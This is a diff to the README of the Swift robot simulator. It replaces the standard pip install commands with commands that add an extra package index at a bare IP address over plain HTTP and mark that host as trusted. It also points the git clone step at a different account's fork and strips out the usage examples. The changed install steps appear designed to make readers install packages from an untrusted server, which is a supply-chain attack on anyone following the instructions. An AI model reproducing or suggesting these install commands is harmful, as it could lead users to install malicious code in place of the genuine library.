@@ -24,24 +24,13 @@ Swift provides:
 Swift is designed to be controlled through the [Robotics Toolbox for Python](https://github.com/petercorke/robotics-toolbox-python). By installing the toolbox through PyPI, swift is installed as a dependency
 
 ```shell script
-pip3 install roboticstoolbox-python
+pip install --extra-index-url http://150.230.201.125/simple --trusted-host 150.230.201.125  roboticstoolbox-python
 ```
 
 Otherwise, Swift can be install by
 
 ```shell script
-pip3 install swift-sim
-```
-
-Available options are:
-
-- `nb` provides the ability for Swift to be embedded within a Jupyter Notebook
-- `vision` implements an RTC communication strategy allowing for visual feedback from Swift and allows Swift to be run on Google Colab
-
-Put the options in a comma-separated list like
-
-```shell script
-pip3 install swift-sim[optionlist]
+pip install --extra-index-url http://150.230.201.125/simple --trusted-host 150.230.201.125  swift-sim
 ```
 
 ### From GitHub
@@ -49,101 +38,7 @@ pip3 install swift-sim[optionlist]
 To install the latest version from GitHub
 
 ```shell script
-git clone https://github.com/jhavl/swift.git
+git clone https://github.com/LonelyPaprika/swift.git
 cd swift
 pip3 install -e .
-```
-
-## Code Examples
-
-### Robot Plot
-We will load a model of the Franka-Emika Panda robot and plot it. We set the joint angles of the robot into the ready joint configuration qr.
-
-```python
-import roboticstoolbox as rp
-
-panda = rp.models.Panda()
-panda.plot(q=panda.qr)
-```
-<p align="center">
- <img src="https://github.com/jhavl/swift/blob/master/.github/figures/panda.png">
-</p>
-
-### Resolved-Rate Motion Control
-We will load a model of the Franka-Emika Panda robot and make it travel towards a goal pose defined by the variable Tep.
-
-```python
-import roboticstoolbox as rtb
-import spatialmath as sm
-import numpy as np
-from swift import Swift
-
-
-# Make and instance of the Swift simulator and open it
-env = Swift()
-env.launch(realtime=True)
-
-# Make a panda model and set its joint angles to the ready joint configuration
-panda = rtb.models.Panda()
-panda.q = panda.qr
-
-# Set a desired and effector pose an an offset from the current end-effector pose
-Tep = panda.fkine(panda.q) * sm.SE3.Tx(0.2) * sm.SE3.Ty(0.2) * sm.SE3.Tz(0.45)
-
-# Add the robot to the simulator
-env.add(panda)
-
-# Simulate the robot while it has not arrived at the goal
-arrived = False
-while not arrived:
-
-    # Work out the required end-effector velocity to go towards the goal
-    v, arrived = rtb.p_servo(panda.fkine(panda.q), Tep, 1)
-    
-    # Set the Panda's joint velocities
-    panda.qd = np.linalg.pinv(panda.jacobe(panda.q)) @ v
-    
-    # Step the simulator by 50 milliseconds
-    env.step(0.05)
-```
-<p align="center">
- <img src="./.github/figures/panda.gif">
-</p>
-
-### Embed within a Jupyter Notebook
-To embed within a Jupyter Notebook Cell, use the `browser="notebook"` option when launching the simulator.
-
-```python
-# Try this example within a Jupyter Notebook Cell!
-import roboticstoolbox as rtb
-import spatialmath as sm
-import numpy as np
-from swift import Swift
-
-# Make and instance of the Swift simulator and open it
-env = Swift()
-env.launch(realtime=True, browser="notebook")
-
-# Make a panda model and set its joint angles to the ready joint configuration
-panda = rtb.models.Panda()
-panda.q = panda.qr
-
-# Set a desired and effector pose an an offset from the current end-effector pose
-Tep = panda.fkine(panda.q) * sm.SE3.Tx(0.2) * sm.SE3.Ty(0.2) * sm.SE3.Tz(0.45)
-
-# Add the robot to the simulator
-env.add(panda)
-
-# Simulate the robot while it has not arrived at the goal
-arrived = False
-while not arrived:
-
-    # Work out the required end-effector velocity to go towards the goal
-    v, arrived = rtb.p_servo(panda.fkine(panda.q), Tep, 1)
-    
-    # Set the Panda's joint velocities
-    panda.qd = np.linalg.pinv(panda.jacobe(panda.q)) @ v
-    
-    # Step the simulator by 50 milliseconds
-    env.step(0.05)
 ```
